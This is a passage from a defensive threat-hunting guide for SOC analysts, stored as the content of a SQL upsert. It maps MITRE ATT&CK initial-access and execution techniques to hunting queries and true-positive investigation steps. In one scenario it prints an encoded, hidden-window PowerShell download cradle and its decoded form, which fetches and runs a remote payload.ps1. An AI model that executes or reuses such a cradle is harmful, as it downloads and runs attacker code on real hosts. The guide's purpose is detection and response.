
**Investigation Steps:**
```
1. CONFIRM THE DOMAIN
   □ WHOIS lookup: registrar, registrant (often privacy-protected), creation date
   □ Passive DNS: what IPs does it resolve to?
   □ Check if the domain has MX records (email-capable)
   □ Check if a website is hosted (credential harvesting page?)

2. ASSESS RISK
   □ Does the domain mimic your login portal?
   □ Is MX configured to send/receive email (BEC risk)?
   □ Has it been used in phishing campaigns already?
   □ Check URLScan.io for any captures of the domain

3. RESPOND
   □ Submit takedown request to registrar
   □ Add domain to email gateway and web proxy blocklists
   □ Create SIEM alert for any internal connections to this domain
   □ Notify phishing awareness team
   □ Check if any employees have already visited this domain (proxy logs)

4. PROACTIVE
   □ Acquire similar variations yourself (defensive registration)
   □ Set up ongoing monitoring for brand-impersonating domains
```

**TP Confidence:** 🔴 HIGH — Lookalike domain targeting your org with active infrastructure is confirmed resource development.

---

### 4.3 TA0001 — Initial Access

#### Overview
Adversaries use various methods to gain initial foothold in the target network. This is where most attacks become **detectable by SOC teams**.

#### Key Techniques

| Technique ID | Technique | Description | Common Detection Source |
|-------------|-----------|-------------|------------------------|
| T1566 | Phishing | Spear-phishing emails with links/attachments | Email gateway, SIEM |
| T1566.001 | Phishing: Attachment | Malicious file attached to email | Email gateway, EDR |
| T1566.002 | Phishing: Link | Malicious URL in email body | Email gateway, Proxy |
| T1190 | Exploit Public-Facing App | Exploit vulnerabilities in web apps, VPN, RDP | WAF, IDS/IPS, App logs |
| T1133 | External Remote Services | Abuse VPN, RDP, Citrix for access | Auth logs, VPN logs |
| T1078 | Valid Accounts | Use stolen/compromised credentials | Auth logs, UEBA |
| T1199 | Trusted Relationship | Abuse supply chain / partner connections | Network logs, Auth logs |
| T1195 | Supply Chain Compromise | Compromise software supply chain | Endpoint, Integrity monitoring |
| T1189 | Drive-by Compromise | Exploit browser via compromised website | Proxy, EDR, IDS |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Phishing delivery | Email logs | Emails with suspicious attachments (.iso, .img, .lnk, .hta, .vbs) from external senders |
| Exploitation attempts | WAF/IDS logs | SQL injection, path traversal, RCE attempts against public apps |
| Credential stuffing | Auth logs | High volume of failed logins from single IP/IP range against multiple accounts |
| VPN brute force | VPN logs | Repeated authentication failures → eventual success |
| Compromised credentials | SIEM/UEBA | Successful login from unusual geo, impossible travel, new device+location |
| Supply chain | EDR | Signed software executing unexpected child processes |

#### ✅ True Positive Scenario — Phishing with Malicious Attachment (T1566.001)

**Scenario:** SEG quarantined an email with a `.iso` file attached. Subject: "Q4 Financial Review — URGENT". Sender domain `finance-reports-2024.com` was registered 3 days ago.

**Investigation Steps:**
```
1. EMAIL ANALYSIS
   □ Full header analysis: Return-Path, X-Originating-IP, auth results
   □ WHOIS on sender domain: age < 30 days → 🔴
   □ SPF/DKIM/DMARC status → likely all fail
   □ Check if email reached any mailboxes (bypass quarantine?)

2. ATTACHMENT ANALYSIS
   □ Calculate file hash (SHA256)
   □ Check hash on VirusTotal → any detections?
   □ Submit to sandbox (Any.Run, Hybrid Analysis)
   □ Mount the .iso → what files are inside? (.lnk? .exe? .dll?)
   □ Check for hidden files, double extensions
   □ Analyze any scripts/macros inside

3. SCOPE ASSESSMENT
   □ How many recipients received this email?
   □ Search for similar subject lines, sender domains, attachment hashes
   □ Check if any user interacted (clicked, opened, mounted)
   □ If mounted: check EDR for child process execution

4. RESPOND (if TP confirmed)
   □ Purge email from all mailboxes
   □ Block sender domain and IP at email gateway
   □ Block attachment hash at EDR
   □ If user interacted: isolate endpoint, initiate IR
   □ Submit IOCs to threat intel platform
   □ Alert organization with phishing advisory

5. DETECTION IMPROVEMENT
   □ Create/tune rule for .iso attachment detection
   □ Add domain to blocklist
   □ Review and strengthen attachment filtering policies
```

**TP Confidence:** 🔴 HIGH — New domain + weaponized attachment + urgency language + financial lure = confirmed phishing.

#### ✅ True Positive Scenario — Valid Accounts (T1078) — Compromised Credentials

**Scenario:** UEBA flags a successful login for `john.doe@corp.com` from Nigeria at 3:00 AM, followed by mailbox rule creation forwarding all emails to an external Gmail address. John is based in New York and was logged in from his office 2 hours prior.

**Investigation Steps:**
```
1. VERIFY IMPOSSIBLE TRAVEL
   □ Check Azure AD/Entra sign-in logs: timestamps, IPs, geolocations
   □ Confirm John's last known legitimate login and location
   □ Calculate travel distance and time → impossible?
   □ Check if IP is known VPN/proxy/TOR exit node

2. CHECK POST-LOGIN ACTIVITY
   □ Review mailbox rules: forwarding, delete, move rules created
   □ Review sent items: any mass emails or phishing sent?
   □ Check for OAuth app consent grants
   □ Check for password/MFA changes
   □ Review Azure AD audit logs: role changes, app registrations

3. CONFIRM COMPROMISE
   □ Contact John via out-of-band communication (phone call)
   □ Ask if he traveled or used VPN
   □ If NOT John → CONFIRMED COMPROMISE

4. RESPOND
   □ Revoke all active sessions (Azure AD: Revoke-AzureADUserAllRefreshToken)
   □ Reset password immediately
   □ Reset MFA registration
   □ Remove malicious inbox rules
   □ Block the external forwarding address
   □ Review and revert any unauthorized changes
   □ Check if credentials were exposed in known breaches (HaveIBeenPwned)

5. SCOPE EXPANSION
   □ Search for similar impossible travel events for other users
   □ Check if any other accounts logged in from the same Nigerian IP
   □ Review VPN/SSO logs for related anomalies
   □ Check if password spray preceded this login
```

**TP Confidence:** 🔴 HIGH — Impossible travel + inbox rule forwarding to external address = confirmed account compromise.

---

### 4.4 TA0002 — Execution

#### Overview
After gaining access, adversaries execute malicious code. This is one of the **most detectable** tactics because it generates rich telemetry in endpoint logs.

#### Key Techniques

| Technique ID | Technique | Description | Key Detection |
|-------------|-----------|-------------|---------------|
| T1059.001 | PowerShell | Execute PS commands/scripts | Event 4104 (Script Block), Sysmon 1 |
| T1059.003 | Windows Command Shell | cmd.exe execution | Sysmon 1, Event 4688 |
| T1059.005 | Visual Basic (VBA) | Macro execution in Office | EDR, Event 4688 (child of WINWORD.EXE) |
| T1059.007 | JavaScript/JScript | .js execution via wscript/cscript | Sysmon 1, EDR |
| T1047 | WMI (WMIC) | Remote execution via WMI | Event 4688, Sysmon 1 (wmiprvse.exe) |
| T1053.005 | Scheduled Task | Task scheduler for execution | Event 4698, Sysmon 1 (schtasks.exe) |
| T1204.001 | User Execution: Link | User clicks malicious link | Proxy logs, EDR |
| T1204.002 | User Execution: File | User opens malicious file | EDR, Sysmon 1 |
| T1569.002 | System Services: Service | Create service to run code | Event 7045, 4697 |
| T1106 | Native API | Direct API calls (NtCreateThread) | EDR, API monitoring |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Suspicious PowerShell | Windows Events (4104, 4103) | Encoded commands (-enc), download cradles (IEX, Invoke-WebRequest), AMSI bypass |
| Office spawning processes | EDR/Sysmon | WINWORD.EXE → cmd.exe, powershell.exe, mshta.exe, wscript.exe |
| LOLBin execution | EDR/Sysmon | mshta.exe, regsvr32.exe, certutil.exe, rundll32.exe with unusual arguments |
| WMI remote execution | Event 4688/Sysmon | wmic.exe /node: process call create |
| Suspicious scheduled tasks | Event 4698 | Tasks created by non-admin users, pointing to TEMP/AppData paths |
| Script execution | Sysmon Event 1 | cscript.exe or wscript.exe running .js, .vbs, .wsf files from user directories |

#### ✅ True Positive Scenario — Malicious PowerShell Execution (T1059.001)

**Scenario:** SIEM alert fires on PowerShell Script Block Logging (Event 4104). A workstation executed:
```powershell
powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==
```

**Investigation Steps:**
```
1. DECODE THE COMMAND
   □ Base64 decode the -Enc value
   □ Decoded: IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.ps1')
   □ This is a classic download cradle → 🔴 MALICIOUS

2. ANALYZE EXECUTION CONTEXT
   □ What user ran this? (domain\user from Event 4688)
   □ What was the parent process? (explorer.exe? outlook.exe? winword.exe?)
   □ When did it execute? (during business hours or off-hours?)
   □ What endpoint is this? (workstation, server, admin jump box?)

3. CHECK NETWORK ACTIVITY
   □ Did the host connect to 192.168.1.10? (is this internal or external?)
   □ Was payload.ps1 downloaded successfully?
   □ What did the payload contain? (if captured by proxy/PCAP)
   □ Check for subsequent outbound connections (C2)

4. ENDPOINT INVESTIGATION
   □ Check process tree in EDR: what spawned after PowerShell?
   □ Check for persistence mechanisms created (scheduled tasks, registry)
   □ Check for credential access (LSASS access, SAM dump)
   □ Check for lateral movement (RDP, SMB, WMI connections)
   □ Check for file drops in TEMP, AppData, ProgramData

5. RESPOND
   □ Isolate the endpoint immediately
   □ Capture forensic image if required
   □ Block the C2 IP/domain at firewall and proxy
   □ Kill the malicious process tree
   □ Reset user credentials
   □ Scan for persistence artifacts and remove
   □ Hunt for same IOCs across the environment
```

**TP Confidence:** 🔴 CRITICAL — Encoded PowerShell download cradle with hidden window = confirmed malicious execution.

#### ✅ True Positive Scenario — Office Document Spawns Child Process (T1204.002 + T1059.005)

**Scenario:** EDR alerts that `WINWORD.EXE` spawned `cmd.exe`, which then launched `powershell.exe` on a Finance department workstation. The user opened an email attachment named `Invoice_Details.docm`.

**Investigation Steps:**
```
1. PROCESS TREE ANALYSIS
   □ Map the full process chain:
     OUTLOOK.EXE → WINWORD.EXE → cmd.exe → powershell.exe
   □ This is a CLASSIC macro-enabled document attack chain → 🔴
   □ Check PowerShell command line arguments
   □ Check if PowerShell made network connections

2. DOCUMENT ANALYSIS
   □ Retrieve the .docm file (from email quarantine or endpoint)
   □ Calculate file hash → check VirusTotal
   □ Extract and analyze VBA macros (olevba, oletools)
   □ Look for: AutoOpen/Document_Open, Shell(), CreateObject, WScript
   □ Submit to sandbox for dynamic analysis

3. EMAIL ANALYSIS
   □ Who sent the email? External or compromised internal?
   □ Check sender domain reputation and age
   □ Were other users targeted with same attachment?

4. POST-EXECUTION HUNTING
   □ What did PowerShell download/execute?
   □ Check for new files created (Sysmon Event 11)
   □ Check for registry modifications (Sysmon Event 13)
   □ Check for network connections (Sysmon Event 3)
   □ Check for persistence mechanisms
   □ Check if LSASS was accessed (credential dumping)

5. RESPOND
   □ Isolate endpoint
   □ Purge email with same attachment hash from all mailboxes
   □ Block file hash at EDR and email gateway
   □ Block any C2 infrastructure identified
   □ Reset user credentials (assume compromised)
   □ Create detection for this document's IOCs
```

**TP Confidence:** 🔴 CRITICAL — Office application spawning command shell → PowerShell is textbook macro malware execution.

---

## 5. Investigation Checklist — Universal Template

### 5.1 General Threat Hunting Investigation Checklist

```
┌───────────────────────────────────────────────────────────────────────┐
│            UNIVERSAL THREAT HUNTING INVESTIGATION CHECKLIST            │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  PHASE 1: INITIAL TRIAGE (First 15 minutes)                          │
│  □ What triggered the hunt? (Intel, hypothesis, anomaly)              │
│  □ What assets are involved? (hosts, users, services)                │
│  □ What is the potential MITRE ATT&CK tactic/technique?              │
│  □ What data sources are available for investigation?                 │
│  □ Is there an active threat requiring immediate containment?         │
│                                                                       │
│  PHASE 2: DATA COLLECTION (30 minutes)                               │
│  □ Pull relevant logs from SIEM (time-bounded queries)               │
│  □ Review EDR telemetry for affected endpoints                       │
│  □ Check network logs (firewall, proxy, DNS, NetFlow)                │
│  □ Review authentication logs (AD, VPN, cloud IdP)                   │
│  □ Collect threat intelligence on any IOCs found                     │
│                                                                       │
│  PHASE 3: ANALYSIS (1-2 hours)                                       │
│  □ Construct timeline of events                                      │
│  □ Map activity to MITRE ATT&CK techniques                          │
│  □ Identify all affected systems and users                           │
│  □ Determine if this is isolated or part of a campaign               │
│  □ Differentiate legitimate activity from malicious (TP vs FP)       │
│  □ Identify root cause / initial access vector                       │
│  □ Assess lateral movement scope                                     │
│  □ Check for persistence mechanisms                                  │
│  □ Look for data staging or exfiltration indicators                  │
│                                                                       │
│  PHASE 4: VERDICATION & SCOPE                                        │
│  □ Confirm TP with supporting evidence                               │
│  □ Assess total blast radius (all affected assets)                   │
│  □ Determine severity (Critical/High/Medium/Low)                     │
│  □ Identify all IOCs (IPs, domains, hashes, file paths, user agents)│
│                                                                       │
│  PHASE 5: RESPONSE                                                    │
│  □ Contain: Isolate affected systems, block IOCs                     │
│  □ Eradicate: Remove persistence, malware, unauthorized access       │
│  □ Recover: Restore systems, reset credentials, verify integrity     │
│  □ Submit IOCs to threat intel platforms                              │
│                                                                       │
│  PHASE 6: DOCUMENTATION & IMPROVEMENT                                 │
│  □ Document full investigation timeline and findings                 │
│  □ Record all IOCs and TTPs observed                                 │
│  □ Create/update SIEM detection rules                                │
│  □ Write Sigma/YARA rules for future detection                       │
│  □ Update threat model and hunting backlog                           │
│  □ Conduct lessons learned                                           │
│  □ Share intelligence with peer organizations (if applicable)        │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

### 5.2 Key Evidence to Collect Per MITRE Tactic

| Tactic | Key Evidence to Collect |
|--------|------------------------|
| **Initial Access** | Email headers, attachment hashes, sender domain WHOIS, proxy logs for URL clicks |
| **Execution** | Process creation logs (Sysmon 1, 4688), PowerShell 4104, command line arguments |
| **Persistence** | Registry keys (Run, RunOnce), scheduled tasks (4698), services created (7045), startup folders |
| **Privilege Escalation** | Token manipulation artifacts, UAC bypass techniques, exploit evidence |
| **Defense Evasion** | Timestomping evidence, process injection, disabled security services |
| **Credential Access** | LSASS access logs, SAM database access, Kerberoasting tickets, brute force attempts |
| **Discovery** | Network scanning activity, nltest, whoami, net group commands |
| **Lateral Movement** | RDP connections (4624 Type 10), PsExec (7045), WMI (4688), SMB file access |
| **Collection** | File access logs, screen capture tools, keylogger artifacts, archive creation |
| **C2** | DNS queries, proxy logs, unusual beaconing patterns, encoded traffic |
| **Exfiltration** | Large data transfers, cloud upload logs, USB activity, encrypted archives |
| **Impact** | Ransomware notes, deleted shadow copies, destroyed logs, defacement evidence |

---

*Continued in Part 2 → Persistence, Privilege Escalation, Defense Evasion, Credential Access — Advanced TP Scenarios & Hunting Playbooks*$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

COMMIT;
